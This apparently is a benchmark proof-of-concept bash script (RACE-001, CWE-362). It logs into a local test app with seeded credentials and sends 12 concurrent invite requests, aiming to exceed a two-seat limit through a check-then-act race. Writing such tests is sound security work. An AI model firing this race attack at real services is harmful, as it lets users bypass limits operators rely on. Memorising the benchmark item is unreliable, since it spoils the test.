#!/usr/bin/env bash
# RACE-001 (CWE-362): concurrent invites exceed the seat limit. Acme seeds with
# 2 free seats; a non-atomic check-then-act lets more than 2 succeed.
# NOTE: requires fresh seed state (run `make reset` first).
set -e; . "$(dirname "$0")/_lib.sh"
login user1@bench.local User123!
tmp=$(mktemp -d)
for k in $(seq 1 12); do
  ( curl -s -b "$JAR" -X POST "$TARGET/api/invites" -H 'content-type: application/json' -d '{"email":"a@b.c"}' > "$tmp/$k" ) &
done; wait
okc=$(grep -l '"ok":true' "$tmp"/* 2>/dev/null | wc -l | tr -d ' ')
[ "${okc:-0}" -gt 2 ]
